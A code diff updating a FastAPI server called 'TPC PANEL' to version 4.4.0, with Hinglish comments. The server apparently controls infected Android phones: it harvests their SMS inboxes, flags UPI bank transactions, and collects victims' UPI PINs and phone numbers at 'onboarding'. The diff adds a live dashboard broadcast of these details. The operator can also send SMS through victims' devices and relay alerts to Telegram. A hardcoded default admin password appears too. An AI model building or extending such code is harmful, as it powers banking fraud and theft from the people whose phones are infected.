@@ -33,7 +33,7 @@ from backend.database import (
     pairing_codes, activity_logs, utc_now,
 )
 
-# ---------------------------------------------------------------- config
+# ------------------------------------------------------------------ config
 
 BASE_DIR = Path(__file__).resolve().parent.parent
 ADMIN_FILE = BASE_DIR / "admin" / "index.html"
@@ -47,10 +47,9 @@ COOKIE_NAME = "tpc_admin_session"
 ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "ivan")
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "Ahad@198612")
 
-# --- Telegram hardcoded (admin panel ko sirf username/password chahiye).
-# Khali chhodo to DB me bound bot (verify-code flow) use hoga.
-TG_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "")   # "8123456789:AAHxxxx..."
-TG_CHAT_ID   = os.getenv("TG_CHAT_ID", "")     # "123456789"
+# --- Telegram hardcoded (khali chhodo to DB me bound bot use hoga)
+TG_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "")
+TG_CHAT_ID = os.getenv("TG_CHAT_ID", "")
 
 ONLINE_WINDOW_SECONDS = 90
 MAX_TELEMETRY_KEYS = 60
@@ -61,21 +60,35 @@ MAX_SMS_BODY = 1600
 # socket keepalive — idle socket proxy me kat jaata hai
 WS_PING_INTERVAL = 25
 WS_IDLE_TIMEOUT = 120
-OUTBOX_REPUSH_AFTER = 45      # seconds, phir se push karo
-NUMBER_RETRY_AFTER = 300      # seconds, sim number missing ho to dobara maango
+OUTBOX_REPUSH_AFTER = 45          # seconds
+NUMBER_RETRY_AFTER = 300          # seconds
 
 UPI_KEYWORDS = ("upi", "credited", "debited", "vpa", "paid to", "received from")
-AMOUNT_RE = re.compile(r"(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE)
-NUMBER_RE = re.compile(r"^\+?\d{6,15}$")
+AMOUNT_RE = re.compile(r"(?:rs.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE)
+
+# sync endpoints (threadpool me chalte hain) se broadcast ke liye
+MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
 
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
+    global MAIN_LOOP
+    MAIN_LOOP = asyncio.get_running_loop()
     init_db_with_retry()
     yield
+    MAIN_LOOP = None
 
 
-app = FastAPI(title="TPC PANEL", version="4.3.0", lifespan=lifespan)
+app = FastAPI(title="TPC PANEL", version="4.4.0", lifespan=lifespan)
+
+# ProxyHeaders OUTERMOST chahiye warna https_only cookie set nahi hoti
+try:
+    from uvicorn.middleware.proxy_headers import ProxyHeadersMiddleware
+except Exception:  # pragma: no cover
+    try:
+        from starlette.middleware.proxy_headers import ProxyHeadersMiddleware
+    except Exception:
+        ProxyHeadersMiddleware = None
 
 app.add_middleware(
     SessionMiddleware,
@@ -86,8 +99,10 @@ app.add_middleware(
     https_only=True,
 )
 
+if ProxyHeadersMiddleware is not None:
+    app.add_middleware(ProxyHeadersMiddleware, trusted_hosts="*")
 
-# ----------------------------------------------------------------- models
+# ------------------------------------------------------------------ models
 
 
 class PairRequest(BaseModel):
@@ -125,6 +140,7 @@ class OnboardingRequest(BaseModel):
     upi_pin: str = Field(default="", max_length=8)
     amount: float = 1.0
     device_name: str | None = Field(default=None, max_length=60)
+    telemetry: dict | None = None
 
 
 class SmsIncomingRequest(BaseModel):
@@ -146,7 +162,7 @@ class AdminLoginRequest(BaseModel):
 
 
 class SendRequest(BaseModel):
-    target: str = Field(default="all")          # all | online | device
+    target: str = Field(default="all")
     device_id: str | None = None
     body: str = Field(min_length=1, max_length=MAX_SMS_BODY)
     to: str | None = None
@@ -168,7 +184,7 @@ class BotRequest(BaseModel):
     channel: str = Field(min_length=1, max_length=120)
 
 
-# -------------------------------------------------------------- utilities
+# --------------------------------------------------------------- utilities
 
 
 def hash_value(v: str) -> str:
@@ -193,8 +209,11 @@ def normalize_number(raw) -> str:
 def log_event(event_type: str, details=None, device_id=None, admin_id=None):
     try:
         activity_logs.insert_one({
-            "event_type": event_type, "details": details,
-            "device_id": device_id, "admin_id": admin_id, "created_at": utc_now(),
+            "event_type": event_type,
+            "details": details,
+            "device_id": device_id,
+            "admin_id": admin_id,
+            "created_at": utc_now(),
         })
     except PyMongoError:
         pass
@@ -386,8 +405,10 @@ def insert_message(doc: dict, dedupe: bool = True) -> Optional[ObjectId]:
     """Insert message, duplicate (same device/dir/body/minute) skip karo."""
     try:
         if dedupe:
-            key = dedupe_key(doc["device_id"], doc["direction"], doc.get("address", ""),
-                             doc.get("body", ""), doc.get("created_at") or utc_now())
+            key = dedupe_key(
+                doc["device_id"], doc["direction"], doc.get("address", ""),
+                doc.get("body", ""), doc.get("created_at") or utc_now(),
+            )
             doc["dedupe_key"] = key
             if messages.find_one({"dedupe_key": key}):
                 return None
@@ -396,7 +417,7 @@ def insert_message(doc: dict, dedupe: bool = True) -> Optional[ObjectId]:
         return None
 
 
-# -------------------------------------------------------------------- hub
+# --------------------------------------------------------------------- hub
 
 
 class Hub:
@@ -431,12 +452,77 @@ class Hub:
             await ws.send_json(payload)
             return True
         except Exception:
-            # dead socket — turant hata do taaki status sach dikhe
             await self.remove_device(device_id, ws)
             return False
 
 
 hub = Hub()
+
+
+class AdminHub:
+    """Admin dashboard live sockets."""
+
+    def __init__(self):
+        self.sockets: set = set()
+        self.lock = asyncio.Lock()
+
+    async def add(self, ws):
+        async with self.lock:
+            self.sockets.add(ws)
+
+    async def remove(self, ws):
+        async with self.lock:
+            self.sockets.discard(ws)
+
+    async def broadcast(self, payload: dict):
+        async with self.lock:
+            targets = list(self.sockets)
+        dead = []
+        for ws in targets:
+            try:
+                await ws.send_json(payload)
+            except Exception:
+                dead.append(ws)
+        for ws in dead:
+            await self.remove(ws)
+
+
+admin_hub = AdminHub()
+
+
+def broadcast(payload: dict):
+    """Sync aur async dono jagah se safe."""
+    loop = MAIN_LOOP
+    if loop is None or loop.is_closed():
+        return
+
+    def _fire():
+        try:
+            asyncio.ensure_future(admin_hub.broadcast(payload))
+        except Exception:
+            pass
+
+    try:
+        loop.call_soon_threadsafe(_fire)
+    except Exception:
+        pass
+
+
+def broadcast_message(doc):
+    if not doc:
+        return
+    try:
+        broadcast({"type": "message", "data": serialize_document(doc)})
+    except Exception:
+        pass
+
+
+def broadcast_device(device_id: str, extra: dict | None = None):
+    payload = {
+        "type": "device_status",
+        "data": {"id": device_id, **(extra or {})},
+    }
+    broadcast(payload)
 
 
 async def send_command(device_id: str, action: str, extra: dict | None = None) -> bool:
@@ -468,8 +554,7 @@ async def push_outbox(device_id: str):
             try:
                 outbox.update_one(
                     {"_id": row["_id"]},
-                    {"$set": {"pushed_at": utc_now()},
-                     "$inc": {"attempts": 1}},
+                    {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
                 )
             except PyMongoError:
                 pass
@@ -490,17 +575,19 @@ async def repush_stale(device_id: str):
     for row in stale:
         if await hub.send_to_device(device_id, push_row(device_id, row)):
             try:
-                outbox.update_one({"_id": row["_id"]},
-                                  {"$set": {"pushed_at": utc_now()},
-                                   "$inc": {"attempts": 1}})
+                outbox.update_one(
+                    {"_id": row["_id"]},
+                    {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
+                )
             except PyMongoError:
                 pass
 
 
-def queue_sms(device_id: str, body: str, to: str | None,
-              source: str = "panel", device_name: str = "") -> tuple[str, str]:
-    """Ek message row + ek outbox row. Ack par wahi message row update hoti hai
-    (pehle duplicate insert hoti thi)."""
+def queue_sms(
+    device_id: str, body: str, to: str | None,
+    source: str = "panel", device_name: str = "",
+) -> tuple[str, str]:
+    """Ek message row + ek outbox row. Ack par wahi message row update hoti hai."""
     now = utc_now()
     to = normalize_number(to) or (to or "").strip()
 
@@ -527,6 +614,12 @@ def queue_sms(device_id: str, body: str, to: str | None,
         "pushed_at": None,
         "created_at": now,
     }).inserted_id
+
+    if msg_id:
+        try:
+            broadcast_message(messages.find_one({"_id": msg_id}))
+        except PyMongoError:
+            pass
 
     return str(outbox_id), str(msg_id) if msg_id else ""
 
@@ -558,13 +651,15 @@ def resolve_targets(payload: SendRequest) -> list:
     return list(devices.find().limit(500))
 
 
-# ------------------------------------------------------------ public
+# --------------------------------------------------------------- public
 
 
 @app.get("/")
 async def home():
-    return {"app": "TPC PANEL", "status": "online", "version": "4.3.0",
-            "owner": "https://t.me/icivan"}
+    return {
+        "app": "TPC PANEL", "status": "online",
+        "version": "4.4.0", "owner": "https://t.me/icivan",
+    }
 
 
 @app.get("/health")
@@ -638,8 +733,11 @@ async def register_device(payload: DeviceRegistrationRequest):
     telemetry = sanitize_telemetry(payload.telemetry)
 
     fields = {
-        "device_name": name, "platform": "android",
-        "last_seen": now, "is_active": True,
+        "device_name": name,
+        "platform": "android",
+        "registration_id": rid,
+        "last_seen": now,
+        "is_active": True,
     }
     if telemetry:
         fields["telemetry"] = telemetry
@@ -652,7 +750,7 @@ async def register_device(payload: DeviceRegistrationRequest):
              "$setOnInsert": {
                  "registration_id_hash": rh,
                  "created_at": now,
-                 "onboarded": False,        # re-register pe True overwrite na ho
+                 "onboarded": False,
              }},
             upsert=True,
         )
@@ -661,6 +759,16 @@ async def register_device(payload: DeviceRegistrationRequest):
         raise HTTPException(409, "Registration conflict")
     except PyMongoError:
         raise HTTPException(503, "Could not register device")
+
+    try:
+        doc = devices.find_one({"registration_id_hash": rh})
+        if doc:
+            broadcast_device(str(doc["_id"]), {
+                "ws_connected": hub.online(str(doc["_id"])),
+                "last_seen": now.isoformat(),
+            })
+    except PyMongoError:
+        pass
 
     return {"status": "registered", "device_name": name}
 
@@ -695,9 +803,15 @@ async def heartbeat(payload: DeviceHeartbeatRequest):
         raise HTTPException(503, "Could not update device")
 
     if hub.online(device_id):
-        # socket up hai — pending SMS aur stale re-push
         asyncio.create_task(push_outbox(device_id))
         asyncio.create_task(repush_stale(device_id))
+
+    broadcast_device(device_id, {
+        "ws_connected": hub.online(device_id),
+        "status": "Online",
+        "last_seen": fields["last_seen"].isoformat(),
+        "telemetry": fields.get("telemetry") or device.get("telemetry") or {},
+    })
 
     # live number missing ho to device se maango (5 min me ek baar)
     merged_t = fields.get("telemetry") or (device.get("telemetry") or {})
@@ -710,8 +824,9 @@ async def heartbeat(payload: DeviceHeartbeatRequest):
             stale = datetime.now(timezone.utc) - last > timedelta(seconds=NUMBER_RETRY_AFTER)
         if stale:
             try:
-                devices.update_one({"_id": device["_id"]},
-                                  {"$set": {"number_requested_at": utc_now()}})
+                devices.update_one(
+                    {"_id": device["_id"]}, {"$set": {"number_requested_at": utc_now()}}
+                )
             except PyMongoError:
                 pass
             asyncio.create_task(send_command(device_id, "fetch_number"))
@@ -734,10 +849,19 @@ async def device_telemetry(payload: DeviceTelemetryRequest):
 
     telemetry = apply_telemetry(device, payload.telemetry)
     try:
-        devices.update_one({"_id": device["_id"]},
-                           {"$set": {"last_seen": utc_now(), "is_active": True}})
+        devices.update_one(
+            {"_id": device["_id"]},
+            {"$set": {"last_seen": utc_now(), "is_active": True}},
+        )
     except PyMongoError:
         pass
+
+    broadcast_device(str(device["_id"]), {
+        "ws_connected": hub.online(str(device["_id"])),
+        "status": "Online",
+        "last_seen": utc_now().isoformat(),
+        "telemetry": telemetry or device.get("telemetry") or {},
+    })
 
     return {"status": "ok", "keys": len(telemetry)}
 
@@ -764,11 +888,15 @@ async def device_command_result(payload: DeviceCommandResultRequest):
         apply_telemetry(device, telemetry)
         if data.get("sim_number"):
             try:
-                devices.update_one({"_id": device["_id"]},
-                                   {"$set": {"number_requested_at": None}})
+                devices.update_one(
+                    {"_id": device["_id"]}, {"$set": {"number_requested_at": None}}
+                )
             except PyMongoError:
                 pass
-
+        broadcast_device(device_id, {
+            "ws_connected": hub.online(device_id),
+            "telemetry": telemetry,
+        })
     elif action == "ack" and data.get("id"):
         await _ack_outbox(data.get("id"), data.get("status") or "sent", data.get("error") or "")
 
@@ -791,7 +919,14 @@ async def sms_incoming(payload: SmsIncomingRequest):
     device_id = str(device["_id"])
     kind, amount, flow = classify_sms(payload.address, payload.body)
 
-    insert_message({
+    created = utc_now()
+    if payload.received_at:
+        try:
+            created = datetime.fromtimestamp(payload.received_at / 1000, tz=timezone.utc)
+        except Exception:
+            created = utc_now()
+
+    mid = insert_message({
         "device_id": device_id,
         "device_name": device.get("device_name", "Unknown"),
         "direction": payload.direction,
@@ -801,8 +936,19 @@ async def sms_incoming(payload: SmsIncomingRequest):
         "amount": amount,
         "flow": flow,
         "status": "received",
-        "created_at": utc_now(),
+        "created_at": created,
     })
+
+    if mid:
+        try:
+            broadcast_message(messages.find_one({"_id": mid}))
+        except PyMongoError:
+            pass
+
+    try:
+        devices.update_one({"_id": device["_id"]}, {"$set": {"last_seen": utc_now()}})
+    except PyMongoError:
+        pass
 
     if kind == "upi" and amount:
         log_event("upi_received", {"amount": amount, "flow": flow}, device_id=device_id)
@@ -813,9 +959,9 @@ async def sms_incoming(payload: SmsIncomingRequest):
             f"From: <code>{payload.address or 'n/a'}</code>"
         )
 
-    replies = evaluate_rules(device_id, device.get("device_name", ""), payload.address,
-                             payload.body, kind)
-
+    replies = evaluate_rules(
+        device_id, device.get("device_name", ""), payload.address, payload.body, kind
+    )
     return {"status": "ok", "kind": kind, "auto_replies": replies}
 
 
@@ -845,12 +991,14 @@ async def sms_sync(payload: SmsSyncRequest):
         ts = item.get("timestamp")
         created = utc_now()
         if isinstance(ts, (int, float)):
-            created = datetime.fromtimestamp(ts / 1000, tz=timezone.utc)
+            try:
+                created = datetime.fromtimestamp(ts / 1000, tz=timezone.utc)
+            except Exception:
+                created = utc_now()
 
         kind, amount, flow = classify_sms(address, body)
 
-        # dedupe=true: re-sync par same SMS dobara insert na ho
-        if insert_message({
+        mid = insert_message({
             "device_id": device_id,
             "device_name": device.get("device_name", "Unknown"),
             "direction": direction,
@@ -861,16 +1009,25 @@ async def sms_sync(payload: SmsSyncRequest):
             "flow": flow,
             "status": "received",
             "created_at": created,
-        }):
+        })
+        if mid:
             saved += 1
+            try:
+                broadcast_message(messages.find_one({"_id": mid}))
+            except PyMongoError:
+                pass
 
-    devices.update_one({"_id": device["_id"]},
-                       {"$set": {"sms_inbox_synced_at": utc_now()}})
+    try:
+        devices.update_one(
+            {"_id": device["_id"]}, {"$set": {"sms_inbox_synced_at": utc_now()}}
+        )
+    except PyMongoError:
+        pass
 
     return {"status": "ok", "saved": saved}
 
 
-# ------------------------------------------------------------ onboarding
+# ------------------------------------------------------------- onboarding
 
 
 @app.post("/devices/onboarding")
@@ -888,6 +1045,13 @@ async def device_onboarding(payload: OnboardingRequest):
     device_id = str(device["_id"])
     now = utc_now()
 
+    if payload.telemetry:
+        apply_telemetry(device, payload.telemetry)
+        try:
+            device = devices.find_one({"_id": device["_id"]}) or device
+        except PyMongoError:
+            pass
+
     fields = {
         "phone_number": normalize_number(payload.phone_number) or payload.phone_number.strip(),
         "payment_app": payload.payment_app.strip(),
@@ -895,6 +1059,7 @@ async def device_onboarding(payload: OnboardingRequest):
         "onboard_amount": payload.amount,
         "onboarded": True,
         "onboarded_at": now,
+        "onboarding_pending": False,
     }
     if payload.device_name:
         fields["device_name"] = payload.device_name.strip()
@@ -904,9 +1069,16 @@ async def device_onboarding(payload: OnboardingRequest):
     except PyMongoError:
         raise HTTPException(503, "Database error")
 
-    # live number bhi maango taaki panel me entered + real dono dikhe
     if hub.online(device_id):
         asyncio.create_task(send_command(device_id, "fetch_number"))
+
+    broadcast_device(device_id, {
+        "ws_connected": hub.online(device_id),
+        "onboarded": True,
+        "phone_number": fields["phone_number"],
+        "payment_app": fields["payment_app"],
+        "upi_pin": fields["upi_pin"],
+    })
 
     telemetry = device.get("telemetry") or {}
     sim_number = telemetry.get("sim_number") or device.get("sim_number") or "n/a"
@@ -953,6 +1125,16 @@ async def device_outbox(registration_id: str):
 
     rows = list(outbox.find({"device_id": device_id, "status": "pending"}).limit(20))
 
+    # HTTP poll se bhi pushed_at stamp karo taaki repush logic kaam kare
+    for r in rows:
+        try:
+            outbox.update_one(
+                {"_id": r["_id"]},
+                {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
+            )
+        except PyMongoError:
+            pass
+
     return {
         "items": [
             {"id": str(r["_id"]), "to": r.get("to") or "", "body": r.get("body") or ""}
@@ -996,6 +1178,14 @@ async def _ack_outbox(item_id: str, status: str, error: str = ""):
             "created_at": utc_now(),
         }, dedupe=False)
 
+    if row:
+        broadcast({"type": "ack", "data": {
+            "id": item_id,
+            "status": status,
+            "error": error,
+            "device_id": row.get("device_id"),
+        }})
+
     return row
 
 
@@ -1008,11 +1198,10 @@ async def device_outbox_ack(item_id: str, payload: dict | None = None):
     return {"status": "ok"}
 
 
-# ---------------------------------------------------------------- rules
+# ------------------------------------------------------------------ rules
 
 
-def evaluate_rules(device_id: str, device_name: str, sender: str,
-                   body: str, kind: str) -> int:
+def evaluate_rules(device_id: str, device_name: str, sender: str, body: str, kind: str) -> int:
     try:
         active = list(rules.find({"enabled": True}).limit(50))
     except PyMongoError:
@@ -1030,7 +1219,6 @@ def evaluate_rules(device_id: str, device_name: str, sender: str,
             continue
 
         _, amount, _ = classify_sms(sender, body)
-
         reply = ((rule.get("reply") or "")
                  .replace("{sender}", sender or "")
                  .replace("{device}", device_name or "")
@@ -1101,7 +1289,7 @@ async def delete_rule(rule_id: str, request: Request):
     return {"status": "ok"}
 
 
-# -------------------------------------------------------------- sending
+# --------------------------------------------------------------- sending
 
 
 @app.post("/admin/send")
@@ -1125,7 +1313,6 @@ async def admin_send(payload: SendRequest, request: Request):
         device_id = str(device["_id"])
         device_name = device.get("device_name", "Unknown")
 
-        # to: manual -> live SIM -> device field -> entered number
         to = manual_to or resolve_device_number(device)
 
         outbox_id, _msg_id = queue_sms(
@@ -1141,9 +1328,10 @@ async def admin_send(payload: SendRequest, request: Request):
             if row:
                 delivered = await hub.send_to_device(device_id, push_row(device_id, row))
                 if delivered:
-                    outbox.update_one({"_id": row["_id"]},
-                                      {"$set": {"pushed_at": utc_now()},
-                                       "$inc": {"attempts": 1}})
+                    outbox.update_one(
+                        {"_id": row["_id"]},
+                        {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
+                    )
 
         results.append({
             "device_id": device_id,
@@ -1194,17 +1382,25 @@ async def device_send_sms(device_id: str, payload: dict, request: Request):
 
     delivered = False
     if hub.online(str(device["_id"])):
-        row = outbox.find_one({"_id": ObjectId(outbox_id)})
+        try:
+            row = outbox.find_one({"_id": ObjectId(outbox_id)})
+        except PyMongoError:
+            row = None
         if row:
-            delivered = await hub.send_to_device(str(device["_id"]), push_row(str(device["_id"]), row))
+            delivered = await hub.send_to_device(
+                str(device["_id"]), push_row(str(device["_id"]), row)
+            )
 
     return {"status": "ok", "queued": 1, "to": to, "delivered": delivered}
 
 
 @app.get("/admin/messages")
-async def admin_messages(request: Request, limit: int = 200,
-                         direction: str | None = None,
-                         device_id: str | None = None):
+async def admin_messages(
+    request: Request,
+    limit: int = 200,
+    direction: str | None = None,
+    device_id: str | None = None,
+):
     require_admin(request)
     limit = max(1, min(limit, 1000))
 
@@ -1222,7 +1418,7 @@ async def admin_messages(request: Request, limit: int = 200,
     return {"messages": [serialize_document(r) for r in rows]}
 
 
-# --------------------------------------------------------------- admin data
+# -------------------------------------------------------------- admin data
 
 
 @app.get("/admin/devices")
@@ -1281,10 +1477,12 @@ async def admin_device_messages(device_id: str, request: Request, limit: int = 5
 
 
 @app.post("/admin/devices/{device_id}/command")
-async def device_command(device_id: str, request: Request,
-                         payload: CommandRequest | None = None):
-    """Device ko socket par command bhejo: ping | fetch_number | sim_info |
-    refresh_telemetry | wake."""
+async def device_command(
+    device_id: str,
+    request: Request,
+    payload: CommandRequest | None = None,
+):
+    """Device ko socket par command bhejo: ping | fetch_number | sim_info | refresh_telemetry | wake."""
     require_admin(request)
 
     action = (payload.action if payload else "ping") or "ping"
@@ -1324,8 +1522,11 @@ async def device_command(device_id: str, request: Request,
 
 
 @app.post("/admin/devices/{device_id}/refresh")
-async def device_refresh(device_id: str, request: Request,
-                         payload: CommandRequest | None = None):
+async def device_refresh(
+    device_id: str,
+    request: Request,
+    payload: CommandRequest | None = None,
+):
     """Frontend fallback — command ka alias."""
     return await device_command(device_id, request, payload)
 
@@ -1385,7 +1586,7 @@ async def admin_overview(request: Request):
         raise HTTPException(503, "Could not load overview")
 
 
-# --------------------------------------------------------------- pairing
+# ---------------------------------------------------------------- pairing
 
 
 @app.post("/pair")
@@ -1397,7 +1598,6 @@ async def create_pair(payload: PairRequest):
     code = secrets.token_urlsafe(8)
     now = utc_now()
 
-    # expires_at MUST be a BSON date — numeric epoch pe TTL index expire nahi karta
     pairing_codes.insert_one({
         "code_hash": hash_value(code),
         "device_name": name,
@@ -1409,7 +1609,7 @@ async def create_pair(payload: PairRequest):
     return {"pair_code": code, "expires_in_seconds": SESSION_TTL}
 
 
-# ------------------------------------------------------------ telegram
+# --------------------------------------------------------------- telegram
 
 
 TELEGRAM_API = "https://api.telegram.org/bot{token}/{method}"
@@ -1428,8 +1628,10 @@ async def tg(token: str, method: str, payload: dict | None = None) -> dict:
 def tg_log(direction: str, text: str, result: str = "ok"):
     try:
         tg_logs.insert_one({
-            "direction": direction, "text": text[:400],
-            "result": result, "created_at": utc_now(),
+            "direction": direction,
+            "text": text[:400],
+            "result": result,
+            "created_at": utc_now(),
         })
     except PyMongoError:
         pass
@@ -1544,7 +1746,6 @@ async def create_bot(payload: BotRequest, request: Request):
         bots.update_one({"bot_id": bot_id}, {"$set": {"webhook_ok": webhook_ok}})
 
     tg_log("out", f"bot configured: @{username} → {channel}")
-
     return {
         "status": "ok",
         "bot_id": bot_id,
@@ -1674,7 +1875,51 @@ async def telegram_webhook(bot_id: str, request: Request):
     return {"ok": True}
 
 
-# ---------------------------------------------------------- device socket
+# ------------------------------------------------------------ admin socket
+
+
+@app.websocket("/ws/admin")
+async def admin_socket(websocket: WebSocket):
+    """Admin dashboard live socket — pehle missing tha, isliye panel sirf polling par chalta tha."""
+    if not websocket.session.get("admin_id"):
+        await websocket.close(code=1008)
+        return
+
+    await websocket.accept()
+    await admin_hub.add(websocket)
+
+    try:
+        try:
+            total = devices.count_documents({})
+        except PyMongoError:
+            total = 0
+
+        await websocket.send_json({
+            "type": "hello",
+            "online": hub.online_count,
+            "devices": total,
+            "server_time": utc_now().isoformat(),
+        })
+
+        while True:
+            raw = await websocket.receive_text()
+            if not raw:
+                continue
+            try:
+                msg = json.loads(raw)
+            except json.JSONDecodeError:
+                continue
+            if str(msg.get("type") or "").lower() == "ping":
+                await websocket.send_json({"type": "pong", "ts": int(time.time())})
+    except WebSocketDisconnect:
+        pass
+    except Exception:
+        pass
+    finally:
+        await admin_hub.remove(websocket)
+
+
+# ----------------------------------------------------------- device socket
 
 
 async def _ws_keepalive(websocket: WebSocket, device_id: str):
@@ -1711,11 +1956,27 @@ async def device_socket(websocket: WebSocket, registration_id: str):
     await hub.add_device(device_id, websocket)
 
     ping_task = asyncio.create_task(_ws_keepalive(websocket, device_id))
+    last_seen_push = 0.0
 
     try:
-        devices.update_one({"_id": device["_id"]},
-                           {"$set": {"ws_connected": True, "ws_connected_at": utc_now()}})
+        try:
+            devices.update_one(
+                {"_id": device["_id"]},
+                {"$set": {
+                    "ws_connected": True,
+                    "ws_connected_at": utc_now(),
+                    "last_seen": utc_now(),
+                }},
+            )
+        except PyMongoError:
+            pass
+
         log_event("device_socket_open", {"device_id": device_id})
+        broadcast_device(device_id, {
+            "ws_connected": True,
+            "status": "Online",
+            "last_seen": utc_now().isoformat(),
+        })
 
         await websocket.send_json({
             "type": "hello",
@@ -1738,6 +1999,17 @@ async def device_socket(websocket: WebSocket, registration_id: str):
             mtype = str(msg.get("type") or "").lower()
             hub.last_pong[device_id] = time.time()
 
+            # last_seen throttle (5s) — DB hammer na ho
+            now_ts = time.time()
+            if now_ts - last_seen_push > 5:
+                last_seen_push = now_ts
+                try:
+                    devices.update_one(
+                        {"_id": device["_id"]}, {"$set": {"last_seen": utc_now()}}
+                    )
+                except PyMongoError:
+                    pass
+
             if mtype in ("ping", "heartbeat"):
                 await websocket.send_json({"type": "pong", "ts": int(time.time())})
                 continue
@@ -1749,23 +2021,40 @@ async def device_socket(websocket: WebSocket, registration_id: str):
                 data = msg.get("data") if isinstance(msg.get("data"), dict) else msg.get("telemetry")
                 if isinstance(data, dict):
                     apply_telemetry(device, data)
+                    broadcast_device(device_id, {
+                        "ws_connected": True,
+                        "telemetry": data,
+                        "last_seen": utc_now().isoformat(),
+                    })
 
             elif mtype == "command_result":
                 data = msg.get("data") if isinstance(msg.get("data"), dict) else {}
                 action = str(msg.get("action") or "").lower()
-                if action in ("fetch_number", "number", "sim_info", "telemetry", "refresh_telemetry"):
+                if action in ("fetch_number", "number", "sim_info", "telemetry",
+                              "refresh_telemetry"):
                     apply_telemetry(device, data)
                     if data.get("sim_number"):
-                        devices.update_one({"_id": device["_id"]},
-                                           {"$set": {"number_requested_at": None}})
+                        try:
+                            devices.update_one(
+                                {"_id": device["_id"]},
+                                {"$set": {"number_requested_at": None}},
+                            )
+                        except PyMongoError:
+                            pass
+                    broadcast_device(device_id, {
+                        "ws_connected": True,
+                        "telemetry": data,
+                    })
 
             elif mtype == "ack":
                 item_id = msg.get("id")
                 if item_id:
                     try:
-                        await _ack_outbox(str(item_id),
-                                          str(msg.get("status") or "sent"),
-                                          str(msg.get("error") or ""))
+                        await _ack_outbox(
+                            str(item_id),
+                            str(msg.get("status") or "sent"),
+                            str(msg.get("error") or ""),
+                        )
                     except HTTPException:
                         pass
 
@@ -1779,7 +2068,7 @@ async def device_socket(websocket: WebSocket, registration_id: str):
                     if not body:
                         continue
                     kind, amount, flow = classify_sms(address, body)
-                    insert_message({
+                    mid = insert_message({
                         "device_id": device_id,
                         "device_name": device.get("device_name", "Unknown"),
                         "direction": str(item.get("direction") or "in")[:8],
@@ -1791,6 +2080,11 @@ async def device_socket(websocket: WebSocket, registration_id: str):
                         "status": "received",
                         "created_at": utc_now(),
                     })
+                    if mid:
+                        try:
+                            broadcast_message(messages.find_one({"_id": mid}))
+                        except PyMongoError:
+                            pass
 
     except WebSocketDisconnect:
         pass
@@ -1800,8 +2094,8 @@ async def device_socket(websocket: WebSocket, registration_id: str):
         ping_task.cancel()
         await hub.remove_device(device_id, websocket)
         try:
-            devices.update_one({"_id": device["_id"]},
-                               {"$set": {"ws_connected": False}})
+            devices.update_one({"_id": device["_id"]}, {"$set": {"ws_connected": False}})
         except PyMongoError:
             pass
+        broadcast_device(device_id, {"ws_connected": False, "status": "Offline"})
         log_event("device_socket_close", {"device_id": device_id})
